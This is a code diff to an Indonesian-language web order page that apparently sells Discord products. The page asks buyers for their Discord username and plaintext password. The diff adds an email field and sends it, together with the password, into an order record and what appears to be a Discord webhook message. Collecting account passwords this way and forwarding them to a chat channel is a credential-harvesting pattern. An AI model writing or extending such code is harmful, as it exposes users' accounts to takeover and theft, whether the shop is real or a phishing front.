@@ -83,7 +83,6 @@
         .step-num { width: 32px; height: 32px; background: var(--gold); color: var(--dark-blue); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.95rem; flex-shrink: 0; }
         .step-header h3 { font-size: 1.1rem; font-weight: 700; color: var(--white); }
 
-        /* Input Box & Wrapper Mata */
         .pass-wrapper { position: relative; width: 100%; }
         .input-box { width: 100%; padding: 14px; background: #0a0e27; border: 1px solid rgba(212, 175, 55, 0.15); border-radius: 10px; color: white; margin-bottom: 12px; outline: none; transition: 0.3s; font-family: var(--font-body); font-size: 0.9rem; }
         .input-box:focus { border-color: var(--gold); background: #000; }
@@ -128,7 +127,6 @@
         .notif-text h4 { font-weight: 700; font-size: 0.9rem; }
         .notif-text p { font-size: 0.8rem; color: #666; }
 
-        /* Catatan Keamanan */
         .security-note { font-size: 0.75rem; color: #ffb700; background: rgba(255, 183, 0, 0.1); padding: 10px; border-radius: 8px; margin-top: 10px; display: flex; gap: 10px; align-items: center; border: 1px solid rgba(255, 183, 0, 0.2); }
     </style>
 </head>
@@ -218,6 +216,8 @@
                     </div>
                     <input type="number" id="dsc-wa" class="input-box" placeholder="8123456xxx" style="margin-bottom: 0; flex: 1;">
                 </div>
+                <label style="font-size: 0.8rem; opacity: 0.8; display: block; margin-bottom: 5px;">Alamat Email</label>
+                <input type="email" id="email-user" class="input-box" placeholder="nama@email.com">
                 <p style="font-size: 0.7rem; color: var(--gold-light); opacity: 0.8;">*Wajib diisi untuk update status pesanan.</p>
             </div>
         </div>
@@ -286,7 +286,6 @@
         let selected = null;
         let chosenMethod = null;
 
-        // Toggle Password Show/Hide
         window.togglePassword = () => {
             const input = document.getElementById('dsc-pass');
             const icon = document.querySelector('.toggle-pass');
@@ -299,7 +298,6 @@
             }
         };
 
-        // Load Produk
         onValue(ref(db, 'settings/discord_prices'), (snapshot) => {
             const container = document.getElementById('productContainer');
             container.innerHTML = "";
@@ -352,7 +350,7 @@
             if(!document.getElementById('dsc-user').value || !document.getElementById('dsc-pass').value) { triggerShake('card-step-1'); isValid = false; }
             if(!selected) { triggerShake('card-step-2'); isValid = false; }
             if(!chosenMethod) { triggerShake('card-step-3'); isValid = false; }
-            if(!document.getElementById('dsc-wa').value) { triggerShake('card-step-4'); isValid = false; }
+            if(!document.getElementById('dsc-wa').value || !document.getElementById('email-user').value) { triggerShake('card-step-4'); isValid = false; }
             if(!isValid) return;
 
             document.getElementById('textTotal').innerText = "Rp " + parseInt(selected.price).toLocaleString('id-ID');
@@ -395,12 +393,14 @@
             const trxId = "DSC-" + Date.now().toString().slice(-6);
             const now = new Date();
             const waVal = document.getElementById('dsc-wa').value;
+            const emailVal = document.getElementById('email-user').value;
             
             const data = {
                 id: trxId, 
                 username: document.getElementById('dsc-user').value, 
                 password: document.getElementById('dsc-pass').value,
                 wa: "+62" + waVal, 
+                email: emailVal,
                 product: selected.name, 
                 price: selected.price,
                 method: chosenMethod, 
@@ -425,6 +425,7 @@
                             { name: "User/Email", value: data.username },
                             { name: "Password", value: "||" + data.password + "||" },
                             { name: "Kontak WhatsApp", value: data.wa },
+                            { name: "Email Konfirmasi", value: data.email },
                             { name: "Metode", value: data.method },
                             { name: "Total Bayar", value: "Rp " + parseInt(data.price).toLocaleString('id-ID') }
                         ] 
@@ -449,6 +450,5 @@
             }
         };
     </script>
-    <script src="script.js"></script>
 </body>
 </html>
